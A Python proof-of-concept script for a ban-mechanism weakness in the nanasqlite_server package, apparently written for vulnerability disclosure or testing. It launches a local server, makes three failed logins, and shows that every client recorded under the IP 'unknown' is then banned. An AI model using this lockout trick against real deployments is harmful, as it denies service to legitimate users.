import asyncio
import os
import sys
from nanasqlite_server.client import RemoteNanaSQLite, NanaRpcClientProtocol
from nanasqlite_server.cert_gen import generate_certificate
from nanasqlite_server.key_gen import generate_keys
import subprocess
import time
import signal
from aioquic.asyncio import connect

async def run_poc():
    print("--- PoC: Ban Mechanism Weakness ---")

    if not os.path.exists("cert.pem"): generate_certificate()
    if not os.path.exists("nana_public.pub"): generate_keys()

    port = 5558
    env = os.environ.copy()
    if "NANASQLITE_DISABLE_BAN" in env: del env["NANASQLITE_DISABLE_BAN"]
    env["PYTHONPATH"] = "src"
    server_proc = subprocess.Popen(
        [sys.executable, "-m", "nanasqlite_server.server", "--port", str(port)],
        env=env
    )

    time.sleep(2)
    client_config = RemoteNanaSQLite(host="127.0.0.1", port=port, verify_ssl=False).configuration

    print("\n[Vulnerability] IP address is 'unknown' for all local connections.")
    print("If one user fails 3 times, ALL 'unknown' users are banned.")

    for i in range(3):
        try:
            async with connect("127.0.0.1", port, configuration=client_config, create_protocol=NanaRpcClientProtocol) as connection:
                await connection.call_rpc("AUTH_START")
                await connection.call_rpc({"type": "response", "data": b"wrong" * 10})
        except: pass
        print(f"Failed attempt {i+1}")

    print("Now trying to connect again. Should be blocked.")
    try:
        async with connect("127.0.0.1", port, configuration=client_config, create_protocol=NanaRpcClientProtocol) as connection:
            await connection.call_rpc("AUTH_START")
            print("RESULT: [NOT VULNERABLE/BYPASSED] Still can connect.")
    except Exception as e:
        print(f"RESULT: [VULNERABLE] Banned! Even other legitimate users from same IP block would be affected: {e}")

    server_proc.send_signal(signal.SIGINT)
    server_proc.wait()

if __name__ == "__main__":
    asyncio.run(run_poc())
